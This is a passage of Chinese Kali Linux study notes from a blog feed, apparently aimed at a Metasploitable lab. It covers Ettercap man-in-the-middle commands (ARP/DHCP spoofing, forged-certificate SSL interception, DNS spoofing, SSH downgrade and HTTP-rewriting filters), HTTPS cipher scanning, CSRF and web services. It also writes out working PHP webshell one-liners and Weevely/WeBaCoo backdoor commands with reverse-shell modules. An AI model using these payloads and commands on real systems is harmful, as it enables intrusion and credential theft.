<li>可以使用其他工具实现MITM，ettercap之作嗅探和过滤使用</li>
</ul>
</li>
<li>实现MITM的方法 <ul>
<li>ARP（一般为动态类型的ARP表）</li>
<li>ICMP <ul>
<li>ICMP路由重定向，半双工，回包不经过Kali（去包回包都经过Kali为全双工）</li>
<li>-M icmp:00:11:22:33:44:55/10.0.0.1（真实网关的MAC/IP）</li>
</ul>
</li>
<li>DHCP <ul>
<li>修改网关地址，半双工，回包不经过Kali</li>
<li>DHCP发包过程Discover、Offer、Resquest、ACK</li>
<li>−M dhcp:192.168.0.30,35,50−60/255.255.255.0/192.168.0.1（DNS）</li>
</ul>
</li>
<li>Switch Port Stealing（交换机端口窃取）<ul>
<li>交换机根据源MAC地址更新</li>
<li>flood目标地址是本机，源地址是受害者的包（向交换机发送大量泛洪攻击）</li>
<li>适用于ARP静态绑定的环境（arp -s → 添加静态绑定的ARP）</li>
<li>-M port /1.1.1.1/ /1.1.1.2/ </li>
</ul>
</li>
<li>NDP <ul>
<li>IPv6协议欺骗技术</li>
<li>-M ndp //fe80::260d:afff:fe6e:f378/ //2001:db8::2:1/</li>
</ul>
</li>
</ul>
</li>
<li>Linux2.4以上内核对ARP地址欺骗的约束 <ul>
<li>收到非请求的ARP响应包，不更新本地ARP缓存 </li>
<li>Ettercap使用ARP request包进行攻击 </li>
</ul>
</li>
<li>Solaris不根据ARP包更新本地ARP缓存 <ul>
<li>Ettercap使用先发ICMP包来更新ARP缓存</li>
</ul>
</li>
</ul>
<h4 id="6-Ettercap–准备"><a href="#6-Ettercap–准备" class="headerlink" title="6. Ettercap–准备"></a>6. Ettercap–准备</h4><ul>
<li>用户操作界面 <ul>
<li>-T 文本界面（文本字符）</li>
<li>-G 图形界面 </li>
<li>-C 基于文本的图形界面（文本类似图形化）</li>
<li>-D 后台模式 </li>
</ul>
</li>
<li>指定目标 <ul>
<li>IPv4：MAC/IPv4/Ports </li>
<li>IPv6：MAC/IPv4/IPv6/Ports </li>
<li>/10.0.0.1−5;10.0.1.33/20−25,80,110</li>
</ul>
</li>
<li>权限 <ul>
<li>主配置文件：/etc/ettercap/etter.conf</li>
<li>需要root权限打开链路层Socket连接，然后使用nobody账号运行 </li>
<li>日志写入目录需要nobody有写入权 </li>
<li>修改etter.conf：EC_UID=65534/EC_GID=65534 → EC_UID=0/EC_GID=0</li>
</ul>
</li>
<li>基于伪造证书的SSL MITIM <ul>
<li>Bridge模式不支持SSL MITM ▲ 2020.1.24报额外参数的错误</li>
<li><strong><code>🔺命令：openssl genrsa −out etter.ssl.crt 1024</code></strong> </li>
<li><strong><code>🔺命令：openssl req −new−keyetter.ssl.crt −out tmp.csr</code></strong> </li>
<li><strong><code>🔺命令：openssl x509 −req −days 1825 −in tmp.csr −signkey etter.ssl.crt −out tmp.new</code></strong> </li>
<li><strong><code>🔺命令：cat tmp.new&gt;&gt;etter.ssl.crt</code></strong></li>
<li><strong><code>🔺命令：rm −f tmp.newtmp.csr</code></strong></li>
</ul>
</li>
</ul>
<h4 id="7-Ettercap–字符模式"><a href="#7-Ettercap–字符模式" class="headerlink" title="7. Ettercap–字符模式"></a>7. Ettercap–字符模式</h4><ul>
<li>参数<ul>
<li>-M（MITM技术）</li>
<li>-F（过滤器）</li>
<li>-P（模块）</li>
<li>-w（网络流量记录）</li>
<li>-l（简单记录日志）</li>
<li>-L（记录所有日志信息）</li>
<li>-m（账号密码信息）</li>
<li>-q（安静模式/有用的信息）</li>
</ul>
</li>
<li>MITM攻击<ul>
<li><strong><code>🔺命令：ettercap -i eth0 -T -M arp -q /192.168.1.1// /192.168.1.2// -F 1.ef -P autoadd -w a.cap -l loginfo -L logall -m message</code></strong></li>
<li>找一个FTP服务器</li>
<li>输入账号/密码</li>
<li>查看ettercap字符界面</li>
</ul>
</li>
<li>Ettercap 日志查看 ▲ 2020.1.24查看无权限<ul>
<li><strong><code>🔺命令：cat message</code></strong>（root目录下）</li>
<li><strong><code>🔺命令：ls log发现文件是加密信息</code></strong></li>
<li><strong><code>🔺命令：etterlog -p log.eci 查看获取的密码</code></strong></li>
<li><strong><code>🔺命令：etterlog -c log.ecp 列出Log中的连接</code></strong></li>
<li><strong><code>🔺命令：etterlog -c -f //1.1.1.1/ log.ecp</code></strong></li>
<li><strong><code>🔺命令：etterlog -B -n -s -F TCP:1.1.1.1:20;1.1.1.2:1234 log.ecp &gt; aa 选择相应的连接并榨取文件</code></strong></li>
</ul>
</li>
</ul>
<h4 id="8-Ettercap–图形界面"><a href="#8-Ettercap–图形界面" class="headerlink" title="8. Ettercap–图形界面"></a>8. Ettercap–图形界面</h4><ul>
<li>Sniff → Unified/Bridge sniffing → 网卡</li>
<li>Host → Scan for hosts（主机扫描，会生成一个主机列表）</li>
<li>选择目标 → Add to target1 / 选择目标 → Add to target2</li>
<li>Mitm → ARP → Sniff remote connections（ARP双向中间人，Single为半双工）</li>
<li>Start → Start sniffing</li>
<li>找一个FTP服务器</li>
<li>输入账号/密码</li>
<li>查看ettercap图形界面</li>
</ul>
<h4 id="9-Ettercap–SSL中间人攻击"><a href="#9-Ettercap–SSL中间人攻击" class="headerlink" title="9. Ettercap–SSL中间人攻击"></a>9. Ettercap–SSL中间人攻击</h4><ul>
<li>SSL MITM（默认无开启，需要在配置文件中修改，图形界面）<ul>
<li><strong><code>🔺命令：vi /etc/ettercap/etter.conf</code></strong>（Linux → The second iptables）</li>
<li>Sniff → Unified/Bridge sniffing → 网卡</li>
<li>Host → Scan for hosts（主机扫描，会生成一个主机列表）</li>
<li>选择目标 → Add to target1 / 选择目标 → Add to target2</li>
<li>Mitm → ARP → Sniff remote connections（ARP双向中间人，Single为半双工）</li>
<li>Start → Start sniffing</li>
<li>找一个有SSL页面</li>
<li>输入账号/密码</li>
<li>查看ettercap图形界面</li>
</ul>
</li>
</ul>
<h4 id="10-Ettercap–DNS欺骗"><a href="#10-Ettercap–DNS欺骗" class="headerlink" title="10. Ettercap–DNS欺骗"></a>10. Ettercap–DNS欺骗</h4><ul>
<li>DNS欺骗（图形界面） <ul>
<li>dns_spoof插件配置文件 </li>
<li><strong><code>🔺命令：vi /etc/ettercap/etter.dns</code></strong>（修改欺骗的域名对应的IP地址）</li>
<li>Plugins → Load a plugins → Load ec_dns_spoof.so</li>
<li>Plugins → Manage the plugins → 双击dns_spoof启动</li>
<li>Sniff → Unified/Bridge sniffing → 网卡</li>
<li>Host → Scan for hosts（主机扫描，会生成一个主机列表）</li>
<li>选择目标 → Add to target1 / 选择目标 → Add to target2</li>
<li>Mitm → ARP → Sniff remote connections（ARP双向中间人，Single为半双工）</li>
<li>Start → Start sniffing</li>
<li>找一个有SSL页面</li>
<li>输入账号/密码</li>
<li>查看ettercap图形界面</li>
</ul>
</li>
<li>DNS欺骗（字符界面）<ul>
<li><strong><code>🔺命令：ettercap -i eth0 -T -M arp -q /192.168.1.1// /192.168.1.2// -P dns_spoof</code></strong></li>
<li><strong><code>🔺命令：ipconfig /flushdns</code></strong></li>
<li><strong><code>🔺命令：ping 欺骗的域名</code></strong></li>
</ul>
</li>
</ul>
<h4 id="11-Ettercap–Filter"><a href="#11-Ettercap–Filter" class="headerlink" title="11. Ettercap–Filter"></a>11. Ettercap–Filter</h4><ul>
<li>Filter <ul>
<li>/usr/share/ettercap/</li>
<li>▲ SSH-2.xx / SSH-1.99（既支持SSH-1，也支持SSH-2） / SSH-1.51</li>
<li>etter.filter.ssh（ssh过滤文件，把SSH-2.xx/SSH-1.99转变为SSH-1.51）</li>
<li><strong><code>🔺命令：etterfilter etter.filter.ssh -o ssh.ef</code></strong></li>
<li><strong><code>🔺命令：mv ssh.ef /root</code></strong></li>
<li>直接调用 -F ssh.ef（若发送SSH-1.99，则降级SSH-1.99为SSH-1.51）</li>
</ul>
</li>
<li>替换HTTP内容（图片的内容可以替换为一个EXE或者脚本文件）</li>
</ul>
<pre><code>if (ip.proto == TCP &amp;&amp; tcp.src == 80) { 
     msg(&quot;data on TCP 80\n&quot;); 
         replace(&quot;img src=&quot;, &quot;img src=\&quot;http://1.1.1.1/1.gif\&quot; &quot;); replace(&quot;IMG src=&quot;, &quot;img src=\&quot;http://1.1.1.1/1.gif\&quot; &quot;); replace(&quot;IMG SRC=&quot;, &quot;img src=\&quot;http://1.1.1.1/1.gif\&quot; &quot;); 
     }</code></pre>]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(五十七)：AJAX、Web Server</title>
    <url>/2020/01/24/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E4%B8%83)%EF%BC%9AAJAX%E3%80%81Web%20Server/</url>
    <content><![CDATA[<hr>
<h4 id="1-AJAX"><a href="#1-AJAX" class="headerlink" title="1. AJAX"></a>1. AJAX</h4><ul>
<li>Asynchronous JavaScript and XML</li>
<li>是一个概念，而非一种新的编程语言，是一组现有技术的组合</li>
<li>通过客户端脚本动态更新页面部分内容，而非整个页面</li>
<li>降低带宽使用，提高速度</li>
<li>提升用户体验</li>
<li>后台异步访问</li>
</ul>
<h4 id="2-AJAX、DHTML、DOM"><a href="#2-AJAX、DHTML、DOM" class="headerlink" title="2. AJAX、DHTML、DOM"></a>2. AJAX、DHTML、DOM</h4><ul>
<li>AJAX组件<ul>
<li>JavaScript：ajax的核心组件，使用XMLHTTPRequest对象接口向服务器发起请求，接收并处理服务器响应数据</li>
</ul>
</li>
<li>Dynamic HTML（DHTML）<ul>
<li>早于AJAX出现，通过javascript、CSS等在客户端修改HTML页面element，缺点是完全依赖客户端代码修改页面，与服务器的交互由javascript applets完成，AJAX的XHR弥补了他的缺点（注册用户）</li>
</ul>
</li>
<li>Document Object Model（DOM）<ul>
<li>处理html、xml文档对象的框架，DHTML是一个浏览器，DOM作为其一个实现的接口，定义和管理每个页面元素obj的Properties、method、event</li>
</ul>
</li>
</ul>
<h4 id="3-基于AJAX的WEB应用工作流程"><a href="#3-基于AJAX的WEB应用工作流程" class="headerlink" title="3. 基于AJAX的WEB应用工作流程"></a>3. 基于AJAX的WEB应用工作流程</h4><ul>
<li>XMLHTTPRequest API创建对象xmlhttp进行访问</li>
<li>Xml、json（默认首选）、html、文本、图片</li>
<li>多个异步请求独立通信，互不依赖</li>
<li>AJAX框架<ul>
<li>JQuery</li>
<li>Dojo Toolkit</li>
<li>Google web toolkit（GWT）</li>
<li>Microsoft AJAX library</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>⭐请求过程：User Interface →(JavaScript)→ AJAX Engine →(HTTP Request)→ Web Server → Database,backend server
⭐响应过程：Databse,backend server → Web Server →(HTML\JSON\XML)→ AJAX Engine →(DHTML)→ User Interface</code></pre></blockquote>
<h4 id="4-AJAX的安全问题"><a href="#4-AJAX的安全问题" class="headerlink" title="4. AJAX的安全问题"></a>4. AJAX的安全问题</h4><ul>
<li>目前没有通用的AJAX安全最佳实践，其攻击面不为大多数人所知</li>
<li>AJAX的安全问题<ul>
<li>多种技术混合，增加了攻击面，每个参数都可能形成独立的攻击过程</li>
<li>AJAX引擎是个全功能的脚本解释器，访问恶意站点可能后果严重，虽然浏览器有沙箱和SOP（同源策略），但可能绕过</li>
<li>服务器、客户端代码结合使用产生混乱，服务器访问控制不当，将信息泄露、</li>
<li>暴漏应用程序逻辑</li>
</ul>
</li>
<li>AJAX对渗透测试的挑战<ul>
<li>异步请求数量多且隐蔽</li>
<li>触发AJAX请求的条件无规律</li>
<li>手动和截断代理爬网可能产生大量遗漏</li>
</ul>
</li>
<li>AJAX爬网工具<ul>
<li>ZAP（Sites → 右键 → Attack → AJAX Spider）</li>
</ul>
</li>
<li>客户端代码审计<ul>
<li>源码</li>
<li>Firebug</li>
</ul>
</li>
</ul>
<h4 id="5-Web-Service（F12）"><a href="#5-Web-Service（F12）" class="headerlink" title="5. Web Service（F12）"></a>5. Web Service（F12）</h4><ul>
<li>Web Service<ul>
<li>面向服务的架构（service oriented architecture）便于不同系统集成共享数据和功能</li>
<li>尤其适合不想要暴漏数据模型和程序逻辑而访问数据的场景</li>
<li>无页面（最典型的类型）</li>
</ul>
</li>
<li>两种类型的Web Service<ul>
<li>Simple object access protocol（SOAP）<ul>
<li>传统的Web Service开发方法，xml是唯一的数据交换格式</li>
<li>要求安全性的应用更多采用</li>
</ul>
</li>
<li>RESTful（Representational Transfer architecture–REST）<ul>
<li>目前更多被采用的轻量的web service，JSON是首选数据交换格式</li>
</ul>
</li>
</ul>
</li>
<li>Web Service安全考虑<ul>
<li>使用API Key或session token实现和跟踪身份认证</li>
<li>身份认证由服务器完成，而非客户端</li>
<li>API Key、用户名、Session token永远不要通过URL发送</li>
<li>RESTful默认不提供任何安全机制，需要使用SSL/TLS保护传输数据安全</li>
<li>SOAP提供强于HTTPS的WS-security机制（传输层实现）</li>
<li>使用OAuth或HMAC进行身份验证，HMAC身份认证使用C/S共享的密钥加密API KEY</li>
<li>RESTful应只允许身份认证用户使用PUT、DELETE方法</li>
<li>使用随机token防止CSRF攻击</li>
<li>对用户提交参数过滤，建议布署基于严格白名单的方法</li>
<li>报错信息消毒</li>
<li>直接对象引用应严格身份验证（电商公司以ID作为主索引）</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(五十五)：Https攻击</title>
    <url>/2020/01/22/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E4%BA%94)%EF%BC%9AHttps%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<hr>
<h4 id="1-HTTPS攻击"><a href="#1-HTTPS攻击" class="headerlink" title="1. HTTPS攻击"></a>1. HTTPS攻击</h4><ul>
<li>全站HTTPS正成为潮流趋势<ul>
<li>淘宝、百度</li>
</ul>
</li>
<li>HTTPS的作用<ul>
<li>CIA</li>
<li>解决的是信息传输过程中数据被篡改、窃取</li>
<li>加密：对称、非对称、单向(hash计算)</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>⭐CIA
C：机密性（Confidentiality）指只有授权用户可以获取信息。
I：完整性（Integrity）指信息在输入和传输的过程中，不被非法授权修改和破坏，保证数据的一致性。
A：可用性（Availability）指保证合法用户对信息和资源的使用不会被不正当地拒绝。</code></pre></blockquote>
<ul>
<li>HTTPS攻击方法<ul>
<li>降级攻击（高强度加密算法的降级攻击）</li>
<li>解密攻击（明文、证书伪造）</li>
<li>协议漏洞、实现方法的漏洞、配置不严格</li>
</ul>
</li>
</ul>
<h4 id="2-Secure-socket-layer"><a href="#2-Secure-socket-layer" class="headerlink" title="2. Secure socket layer"></a>2. Secure socket layer</h4><ul>
<li>保证网络通信安全的加密协议</li>
<li>1994年由Netscape开发成为统一标准</li>
<li>1999年TLS（transport layer security）取代SSL v3</li>
<li>近年来发现的SSL协议漏洞使业界认为其漏洞已不可软件修复<ul>
<li>Heartbleed</li>
<li>POODLE</li>
<li>BEAST</li>
</ul>
</li>
<li>TLS当前最新版本1.2</li>
<li>TLS/SSL、HTTPS、HTTP over SSL通俗上表示同意含义</li>
<li>SSL/TLS也被用于其他场景的传输通道加密<ul>
<li>邮件传输（服务器间、客户端与服务期间,SMTP/POP3为明文协议）</li>
<li>数据库服务器间</li>
<li>LDAP身份认证服务器</li>
<li>SSL VPN</li>
<li>远程桌面RDP通信过程中的加密和身份认证</li>
</ul>
</li>
</ul>
<h4 id="3-SSL加密"><a href="#3-SSL加密" class="headerlink" title="3. SSL加密"></a>3. SSL加密</h4><ul>
<li>WEB通信中的SSL加密（PKI体系架构）<ul>
<li>公钥证书（受信任的第三方证书颁发机构签名颁发）</li>
<li>VeriSign</li>
<li>Thawte</li>
<li>GlobalSign</li>
<li>Symantec</li>
</ul>
</li>
<li>加密过程<ul>
<li>握手、协商加密算法、获取公钥证书、验证公钥证书、交换会话密钥、加密信息传输</li>
<li>加密套件（Cipher Suite：对称加密+非对称加密+单向加密+密钥算法）</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>⭐加密信息传输过程（哈希值用于数据传输的完整性）
1.用交换的对称密钥对明文进行加密
2.对加密的明文进行哈希计算，得出一串额外的字符串
3.对字符串进行服务器私钥加密
▲ 存在疑问4.加密过程中，将对称密码加密的明文+哈希值+加密后的哈希值一起传给对方
⭐加密信息解密过程
1.用服务器公钥对哈希值进行解密，得出哈希值H2
2.用交换的对称密钥对对称密钥加密的字段进行解密，并计算哈希值H1
3.比对哈希值H1和H2的值是否相等，保证了数据的完整性和身份认证</code></pre></blockquote>
<h4 id="4-加密算法"><a href="#4-加密算法" class="headerlink" title="4. 加密算法"></a>4. 加密算法</h4><ul>
<li>非对称加密算法<ul>
<li>Diffie-Hellman Key exchange（密钥交换）</li>
<li>Rivest Shamir Adleman（RSA）</li>
<li>Elliptic Curve Cryptography（ECC）</li>
</ul>
</li>
<li>对称加密算法<ul>
<li>Data Encryption Standard（DES/3DES）</li>
<li>Advance Encryption Standard（AES）</li>
<li>International Data Encryption Algorithm（IDEA）</li>
<li>Rivest Cipher 4（RC4）<ul>
<li>WEP、TLS/SSL、RDP、Secure shell</li>
</ul>
</li>
</ul>
</li>
<li>单向加密算法（hash算法）<ul>
<li>SHA-3已经设计完成，但尚未广泛使用</li>
<li>SHA-2是TLS1.2唯一支持的单向加密算法</li>
<li>碰撞攻击针对单向加密算法<ul>
<li>两个不同的文件生成相同的HASH值</li>
</ul>
</li>
</ul>
</li>
</ul>
<table>
<thead>
<tr>
<th align="center">HASH算法</th>
<th align="center">HASH值长度（bit）</th>
</tr>
</thead>
<tbody><tr>
<td align="center">MD5</td>
<td align="center">128</td>
</tr>
<tr>
<td align="center">SHA-1</td>
<td align="center">160</td>
</tr>
<tr>
<td align="center">SHA-2</td>
<td align="center">224、256、384、512</td>
</tr>
</tbody></table>
<h4 id="5-SSL的弱点"><a href="#5-SSL的弱点" class="headerlink" title="5. SSL的弱点"></a>5. SSL的弱点</h4><ul>
<li>SSL是不同的对称、非对称、单向加密算法的组合加密实现（cipher suite）</li>
</ul>
<table>
<thead>
<tr>
<th align="center">加密算法</th>
<th align="center">SSL实现中的用途</th>
</tr>
</thead>
<tbody><tr>
<td align="center">RAS/Diffie-Hellman</td>
<td align="center">密钥交换、身份认证</td>
</tr>
<tr>
<td align="center">AES</td>
<td align="center">加密数据，由RAS/DH完成密钥交换</td>
</tr>
<tr>
<td align="center">HMAC-SHA2</td>
<td align="center">摘要信息</td>
</tr>
</tbody></table>
<ul>
<li>服务器端为提供更好的兼容性，选择支持大量过时的cipher suite</li>
<li>协商过程中强迫降级加密强度</li>
<li>现代处理器计算能力可以在可接受的时间内破解时加密算法</li>
<li>购买云计算资源破解</li>
</ul>
<h4 id="6-Openssl"><a href="#6-Openssl" class="headerlink" title="6. Openssl"></a>6. Openssl</h4><ul>
<li>直接调用openssl库识别目标服务器支持的SSL/TLS cipher suite</li>
<li><strong><code>🔺命令：openssl s_client -connect www.baidu.com:443</code></strong></li>
<li><strong><code>🔺命令：openssl s_client -tls1_2 -cipher &#39;ECDH-RSA-RC4-SHA&#39; -connect www.taobao.com:443</code></strong> ▲ 2020.1.22 SSL routines:SSL_CTX_set_cipher_list:no cipher match<ul>
<li>▲ 密钥交换–身份认证–数据加密–HASH算法</li>
</ul>
</li>
<li><strong><code>🔺命令：openssl s_client -tls1_2 -cipher &quot;NULL,EXPORT,LOW,DES&quot; -connect www.taobao.com:443</code></strong>（协商低安全级别cipher suite）</li>
<li>可被破解的cipher suite<ul>
<li><strong><code>🔺命令：openssl ciphers -v &quot;NULL,EXPORT,LOW,DES&quot;</code></strong></li>
</ul>
</li>
<li><a href="https://www.openssl.org/docs/apps/ciphers.html" target="_blank" rel="noopener">https://www.openssl.org/docs/apps/ciphers.html</a> （cipher suite的组合）</li>
<li>Openssl需要大量的密码学相关知识，命令复杂，结果可读性差</li>
</ul>
<h4 id="7-SSLScan"><a href="#7-SSLScan" class="headerlink" title="7. SSLScan"></a>7. SSLScan</h4><ul>
<li>自动识别SSL配置错误、过期协议、过时cipher suite和hash算法</li>
<li>默认会检查新浪CRIME、heartbleed漏洞</li>
<li>TLS支持的cipher suite<ul>
<li><strong><code>🔺命令：sslscan --tlsall www.taobao.com:443</code></strong></li>
</ul>
</li>
<li>分析证书详细数据<ul>
<li><strong><code>🔺命令：sslscan --show-certificate --no-ciphersuites www.taobao.com:443</code></strong></li>
</ul>
</li>
</ul>
<h4 id="8-SSLyze"><a href="#8-SSLyze" class="headerlink" title="8. SSLyze"></a>8. SSLyze</h4><ul>
<li>Python语言编写</li>
<li>检查SSL过时版本</li>
<li>检查存在弱点的cipher suite</li>
<li>扫描多站点时，支持来源文件</li>
<li>检查是否支持会话恢复</li>
<li><strong><code>🔺命令：sslyze --regular www.baidu.com:443</code></strong></li>
</ul>
<h4 id="9-Nmap"><a href="#9-Nmap" class="headerlink" title="9. Nmap"></a>9. Nmap</h4><ul>
<li><strong><code>🔺命令：nmap --script=ssl-enum-ciphers.nse www.taobao.com</code></strong></li>
</ul>
<h4 id="10-QUALYS-SSL-LABS"><a href="#10-QUALYS-SSL-LABS" class="headerlink" title="10. QUALYS SSL LABS"></a>10. QUALYS SSL LABS</h4><ul>
<li><a href="https://www.sslabs.com/ssltest/" target="_blank" rel="noopener">https://www.sslabs.com/ssltest/</a></li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(五十四)：WebShell</title>
    <url>/2020/01/21/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E5%9B%9B)%EF%BC%9AWebShell/</url>
    <content><![CDATA[<hr>
<h4 id="1-WEBSHELL–浏览器"><a href="#1-WEBSHELL–浏览器" class="headerlink" title="1. WEBSHELL–浏览器"></a>1. WEBSHELL–浏览器</h4><ul>
<li>Shell<ul>
<li>ssh登陆到metasploitable</li>
<li><strong><code>🔺命令：vi a.php</code></strong></li>
<li><code>&lt;?php echo shell_exec($_GET[&#39;cmd&#39;]);?&gt;</code></li>
<li><strong><code>🔺命令：cp a.php /var/www</code></strong></li>
<li>浏览器访问a.php</li>
</ul>
</li>
</ul>
<h4 id="2-WEBSHELL–中国菜刀-▲-2020-1-21暂未使用"><a href="#2-WEBSHELL–中国菜刀-▲-2020-1-21暂未使用" class="headerlink" title="2. WEBSHELL–中国菜刀 ▲ 2020.1.21暂未使用"></a>2. WEBSHELL–中国菜刀 ▲ 2020.1.21暂未使用</h4><ul>
<li>中国菜刀：<a href="http://www.maicaidao.co/（使用unicode编码）" target="_blank" rel="noopener">http://www.maicaidao.co/（使用unicode编码）</a><ul>
<li>将代码新建到靶机上caidao.php</li>
<li><code>&lt;?php @eval(_POST[&#39;chopper&#39;]);?&gt;</code></li>
<li><strong><code>🔺命令：cp caidao.php /var/www</code></strong></li>
<li>菜刀服务端添加caidao.php的URL，进行配置，输入密码，执行</li>
</ul>
</li>
<li>WebShell可能被IDS、AV、WAF、扫描器软件发现查杀</li>
</ul>
<h4 id="3-WEBSHELL–WeBaCoo（PHP）"><a href="#3-WEBSHELL–WeBaCoo（PHP）" class="headerlink" title="3. WEBSHELL–WeBaCoo（PHP）"></a>3. WEBSHELL–WeBaCoo（PHP）</h4><ul>
<li>WeBaCoo（Web Backdoor Cookie）<ul>
<li>类终端的shell</li>
<li>编码通信内容通过cookie头传输，隐蔽性较强</li>
<li>cm：base64编码的命令</li>
<li>cn：服务器用于数据的cookie头的名（默认值）</li>
<li>cp：返回信息定界符（变化的定界符）</li>
<li>生成服务端</li>
</ul>
</li>
<li>生成服务端<ul>
<li><strong><code>🔺命令：webacoo -g -o webacoo.php</code></strong></li>
</ul>
</li>
<li>拷贝webacoo.php到服务器端<ul>
<li><strong><code>🔺命令：scp webacoo.php msfadmin@192.168.1.115:/home/msfadmin</code></strong></li>
<li>ssh登陆到metasploitable</li>
<li><strong><code>🔺命令：cp webacoo.php /var/www</code></strong></li>
</ul>
</li>
<li>客户端连接<ul>
<li><strong><code>🔺命令：webacoo -t -u &quot;http://1.1.1.1/webacoo.php&quot;</code></strong></li>
</ul>
</li>
<li>连接成功会出现命令提示符</li>
<li>抓包查看cookie</li>
<li>其他参数<ul>
<li>-g 生成服务器端代码</li>
<li>-f 添加执行php操作系统函数</li>
<li>-r 返回不进行混淆的代码</li>
<li>-t 远程建立terminal</li>
<li>-u webacoo URL</li>
<li>-e 单命令执行模式</li>
<li>-m HTTP通信方式（默认为Get）</li>
<li>-c 指定Cookie名字</li>
<li>-d 定界符</li>
<li>-a HTTP的user-agent</li>
<li>-p 代理服务</li>
<li>-l 记录日志</li>
<li>update 升级版本</li>
</ul>
</li>
</ul>
<h4 id="4-WEBSHELL–Weevely（PHP）"><a href="#4-WEBSHELL–Weevely（PHP）" class="headerlink" title="4. WEBSHELL–Weevely（PHP）"></a>4. WEBSHELL–Weevely（PHP）</h4><ul>
<li>隐藏的类终端PHP Webshell</li>
<li>30多个管理模块<ul>
<li>执行系统命令、测试文件系统</li>
<li>检查服务器常见配置错误</li>
<li>创建正向、反向TCP Shell连接</li>
<li>通过目标计算机代理HTTP流量</li>
<li>从目标计算机运行端口扫描，渗透内网</li>
</ul>
</li>
<li>支持连接密码</li>
<li>Kali缺少库 ▲ 2020.1.21已支持该库<ul>
<li><a href="https://pypi.python.org/pypi/PySocks/" target="_blank" rel="noopener">https://pypi.python.org/pypi/PySocks/</a></li>
<li><strong><code>🔺命令：./setup.py install</code></strong></li>
</ul>
</li>
<li>生成服务端<ul>
<li><strong><code>🔺命令：weevely generate &lt;password&gt; wee.php</code></strong> </li>
<li>/usr/share/weevely/wee.php ▲ 2020.1.21生成程序在终端所在位置</li>
</ul>
</li>
<li>拷贝wee.php到服务器端<ul>
<li><strong><code>🔺命令：scp wee.php msfadmin@192.168.1.115:/home/msfadmin</code></strong></li>
<li><strong><code>🔺命令：cp wee.php /var/www</code></strong></li>
</ul>
</li>
<li>客户端连接服务器<ul>
<li><strong><code>🔺命令：weevely http://1.1.1.1/wee.php &lt;password&gt;</code></strong></li>
</ul>
</li>
<li>抓包查看HTTP头（过滤：tcp.stream eq 5）</li>
<li>▲ 通过Referer、Cookie、body进行传输，解码可用Base64解码</li>
<li>help（查看模块）<ul>
<li>audit_sgidsgid（SUID+SGID）</li>
<li>audit_filesystem（查找文件设置权限）</li>
<li>audit_phpconf（审计php的配置信息）</li>
<li>system_info（操作系统配置）</li>
<li>backdoor_tcp（本地监听一个shell在TCP端口上）</li>
<li>backdoor_reversetcp（本地监听反弹一个shell）</li>
<li>bruteforce_sql（SQL注入的暴力破解）</li>
<li>net_proxy（把靶机变成代理服务器，但代理IP端口都设置在攻击者上）</li>
<li>net_phpproxy（php代理，需要安装一个php代理在靶机上）</li>
<li>net_scan IP:端口（把靶机作为扫描器）</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(五十三)：CSRF</title>
    <url>/2020/01/21/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E4%B8%89)%EF%BC%9ACSRF/</url>
    <content><![CDATA[<hr>
<h4 id="1-CSRF"><a href="#1-CSRF" class="headerlink" title="1. CSRF"></a>1. CSRF</h4><ul>
<li>Cross-site request forgery</li>
<li>与XSS经常混淆</li>
<li>从信任的角度来区分<ul>
<li>XSS：利用用户对站点的信任</li>
<li>CSRF：利用站点对已经身份认证的信任</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>⭐CSRF过程
1.客户端向服务器发送请求，获得身份认证Token
2.Hacker向客户端发送一个伪造定制页面，诱使客户端点击页面
3.客户端点击页面，页面通过客户端的Token提交数据指令给服务器端
4.服务器端未进行对请求来源的验证，只验证Session是否合法性
▲ 二次认证，随机数机制，验证码机制一定程度上可以防控CSRF漏洞</code></pre></blockquote>
<ul>
<li>结合社工在身份认证会话过程中实现攻击<ul>
<li>修改账号密码、个人信息（email、收获地址）</li>
<li>发送伪造的业务请求（网银、购物、投票）</li>
<li>关注他人社交账号，推送博文</li>
<li>▲ 在用户非自愿、不知情的情况下提交请求</li>
</ul>
</li>
<li>业务逻辑漏洞<ul>
<li>对关键操作缺少确认机制</li>
<li>自动扫描程序无法发现此类漏洞</li>
</ul>
</li>
<li>漏洞利用条件<ul>
<li>被害用户已经完成身份认证</li>
<li>新请求的提交不需要重新身份认证或确认机制</li>
<li>攻击者必须了解Web Application请求的参数构造</li>
<li>诱使用户触发攻击的指令（社工）</li>
</ul>
</li>
<li>▲ 自动扫描程序的检测方法<ul>
<li>在请求和响应过程中检查是否存在anti-CSRF token名（随机数验证）</li>
<li>检查服务器是否验证anti-CSRF token的名值（服务器端是否验证token正确性）</li>
<li>检查token中是否可编辑的字符串</li>
<li>检查referer头是否可以伪造</li>
</ul>
</li>
<li>对策<ul>
<li>Captcha（验证码机制）</li>
<li>anti-CSRF token（使用最广）</li>
<li>Referer头</li>
<li>降低会话超时时间</li>
</ul>
</li>
</ul>
<h4 id="2-CSRF–漏洞利用方法"><a href="#2-CSRF–漏洞利用方法" class="headerlink" title="2. CSRF–漏洞利用方法"></a>2. CSRF–漏洞利用方法</h4><ul>
<li>CSRF → Get方法<ul>
<li>Kali开启apach服务</li>
<li><strong><code>🔺命令：cd /var/www/html</code></strong> <strong><code>🔺命令：vi csrf-get.html</code></strong></li>
<li><code>&lt;a href=&quot;Burpsuit抓取的地址/URL地址抓取&quot;&gt;csrf&lt;/a&gt;</code></li>
<li>window上访问csrf-get.html</li>
</ul>
</li>
